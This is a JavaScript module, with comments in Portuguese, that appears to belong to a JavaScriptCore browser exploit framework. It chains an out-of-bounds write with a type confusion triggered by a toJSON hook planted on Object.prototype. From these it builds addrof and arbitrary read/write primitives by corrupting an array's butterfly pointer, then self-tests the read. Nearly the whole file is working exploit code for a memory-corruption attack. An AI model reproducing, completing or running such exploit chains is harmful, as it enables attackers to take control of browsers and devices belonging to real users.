// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// NOME DO MÓDULO MANTIDO
export const FNAME_MODULE_V28 = "OriginalHeisenbug_Exploited"; 

// --- Configuração da vulnerabilidade conhecida ---
const KNOWN_GOOD_CONFIG = {
    victim_ab_size: 64,
    corruption_offset: 0x7C,
    corruption_value: 0xFFFFFFFF,
    bytes_to_write: 4,
    ppKey: 'toJSON',
};

// --- Variáveis de escopo para a sonda e o exploit ---
let object_to_leak_ref = null;
let addrof_write_was_attempted = false;

// Sonda toJSON que tentará o addrof ao detectar a TC
function toJSON_Exploit_Probe() {
    try {
        const test = this.byteLength; // Acesso que falha se a TC ocorrer
    } catch (e) {
        // SUCESSO! A Type Confusion foi acionada. 'this' agora é um objeto genérico.
        addrof_write_was_attempted = true; // Sinaliza que a TC ocorreu.
        logS3(`[toJSON_Probe] TYPE CONFUSION DETECTADA! Tentando escrita para addrof...`, "vuln");
        try {
            this[0] = object_to_leak_ref; // Escrita crucial para o addrof
        } catch (e_write) {
            logS3(`[toJSON_Probe] Falha na escrita para addrof: ${e_write.message}`, "error");
        }
    }
}

// Função de teste principal
export async function executeArrayBufferVictimCrashTest() {
    const FNAME_TEST = `${FNAME_MODULE_V28}.execute`;
    logS3(`--- Iniciando ${FNAME_TEST}: Exploração Direta do Heisenbug ---`, "test", FNAME_TEST);

    let result = {
        addrof: null,
        fakeobj: null,
        arb_read_success: false,
        message: "Falha na inicialização."
    };

    const originalDesc = Object.getOwnPropertyDescriptor(Object.prototype, KNOWN_GOOD_CONFIG.ppKey);

    try {
        // ========================================================================
        // ETAPA 1: OBTER `addrof` USANDO A SEQUÊNCIA ORIGINAL COMPROVADA
        // ========================================================================
        logS3("ETAPA 1: Acionando Heisenbug para criar 'addrof'...", 'subtest', FNAME_TEST);
        addrof_write_was_attempted = false;

        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(KNOWN_GOOD_CONFIG.corruption_offset, KNOWN_GOOD_CONFIG.corruption_value, KNOWN_GOOD_CONFIG.bytes_to_write);
        await PAUSE_S3(100);

        let victim_ab = new ArrayBuffer(KNOWN_GOOD_CONFIG.victim_ab_size);
        let float64_view = new Float64Array(victim_ab);

        Object.defineProperty(Object.prototype, KNOWN_GOOD_CONFIG.ppKey, { value: toJSON_Exploit_Probe, configurable: true, writable: true, enumerable: false });

        const addrof = (obj) => {
            object_to_leak_ref = obj;
            float64_view.fill(1.2345); // Preenche para garantir que o valor seja sobrescrito
            JSON.stringify(victim_ab); // Aciona a sonda
            const val_double = float64_view[0];
            const buffer = new ArrayBuffer(8);
            new Float64Array(buffer)[0] = val_double;
            return new AdvancedInt64(new Uint32Array(buffer)[0], new Uint32Array(buffer)[1]);
        };
        
        // Testa se a TC ocorreu
        addrof({a:1}); 
        if (!addrof_write_was_attempted) {
            throw new Error("FALHA: A Type Confusion (Heisenbug) não foi acionada. Verifique os offsets e a lógica.");
        }

        result.addrof = addrof;
        logS3("SUCESSO: Primitiva 'addrof' criada!", 'vuln', FNAME_TEST);
        
        // ========================================================================
        // ETAPA 2: CRIAR LEITURA/ESCRITA ARBITRÁRIA
        // ========================================================================
        logS3("ETAPA 2: Criando Leitura/Escrita Arbitrária...", 'subtest', FNAME_TEST);

        let spray_array = [1.1, 2.2]; // Alvo para manipulação
        let spray_array_addr = result.addrof(spray_array);
        let butterfly_addr = (await oob_read_absolute(spray_array_addr.low() + JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, 8)).sub(0x10);

        const arb_read = (addr) => {
            oob_write_absolute(spray_array_addr.low() + JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, addr, 8);
            return spray_array[0];
        };
        const arb_write = (addr, val) => {
            oob_write_absolute(spray_array_addr.low() + JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, addr, 8);
            spray_array[0] = val;
        };
        
        logS3("SUCESSO: Primitivas 'arb_read' e 'arb_write' criadas!", 'vuln', FNAME_TEST);

        // ========================================================================
        // ETAPA 3: TESTE FINAL
        // ========================================================================
        logS3("ETAPA 3: Testando Leitura Arbitrária...", 'subtest', FNAME_TEST);

        let test_victim = { a: 0x41414141, b: 0x42424242 };
        let test_victim_addr = result.addrof(test_victim);
        let test_victim_butterfly = await oob_read_absolute(test_victim_addr.low() + JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, 8);

        logS3(`  Lendo propriedade 'a' de [${test_victim_butterfly.toString(true)} - 0x10]`, 'info');
        let value_read = arb_read(test_victim_butterfly.sub(0x10));

        // Conversão para garantir que o valor lido é numérico para comparação
        let read_as_num = new Float64Array([value_read])[0];
        let expected_num = new Float64Array([0x41414141])[0];

        if (toHex(read_as_num) === toHex(expected_num)) {
             result.arb_read_success = true;
             result.message = "CADEIA DE EXPLORAÇÃO COMPLETA! Leitura arbitrária confirmada.";
             logS3(`SUCESSO DO AUTO-TESTE: Lido ${toHex(read_as_num)} corretamente.`, "vuln");
        } else {
             result.message = `FALHA NO AUTO-TESTE. Lido: ${toHex(read_as_num)}, Esperado: ${toHex(expected_num)}`;
             logS3(result.message, "error");
        }
        
    } catch (e) {
        result.message = e.message;
        logS3(`Erro fatal: ${e.message}`, 'critical', FNAME_TEST);
    } finally {
        if (originalDesc) Object.defineProperty(Object.prototype, KNOWN_GOOD_CONFIG.ppKey, originalDesc);
        await clearOOBEnvironment();
        logS3("Limpeza finalizada.", 'info', FNAME_TEST);
    }

    return result;
}
